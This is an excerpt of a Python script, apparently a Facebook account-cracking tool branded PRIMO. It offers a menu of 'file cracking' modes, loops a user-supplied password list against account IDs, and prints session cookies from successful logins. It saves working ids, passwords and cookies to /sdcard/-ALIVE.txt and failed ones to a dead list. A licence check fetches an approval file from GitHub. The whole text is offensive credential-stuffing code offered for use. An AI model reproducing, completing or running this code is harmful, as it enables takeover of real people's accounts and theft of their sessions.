...
def file():
	clear()
	print(' [1] FILE CRACKING SLOW')
	print(' [2] FILE CRACKING FAST')
	fc = input(' CHOICE : ')
	if fc =='1':
		file1()
	elif fc =='2':
...
def gml():
	...
	print('[?] Total Alive Id Save in  /sdcard/PRIMO-ALIVE.txt')
	print('[?] Total Dead Id Save in  /sdcard/PRIMO-DEAD.txt')
	print(47*"-")
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\033[1;32m[DENV-OK] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🍪]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				open('/sdcard/-ALIVE.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				#print('\r\r\x1b[1;33m [PRIMO-DEAD] '+str(ids)+' | '+pas+'\033[1;97m')
				open('/sdcard/-DEAD.txt','a').write(str(ids)+'|'+pas+'\n')
				break
			else:
				continue
		loop+=1
...
def file2():
	...
	if me in ["1", "01","11","A","a"]:
		...
		for i in range(ps_limit):
			plist.append(input(f' Put password {i+1}: '))
		print(f' Do you want to show dead ids? (y/n): ')
		cx=input(f' Choose: ')
...
def sub():
  ...
  clear()
  print(logo)
  r1=str(urlopen("https://github.com/KLUEN-sketch/PRIMO-CR4CKING/blob/main/approval.txt").read())
  if key1 in r1:
    os.system('clear')
    menu()
  else:
    ...
    time.sleep(3.5)
    os.system('am start https://www.messenger.com/t/10001544715418https://')
menu()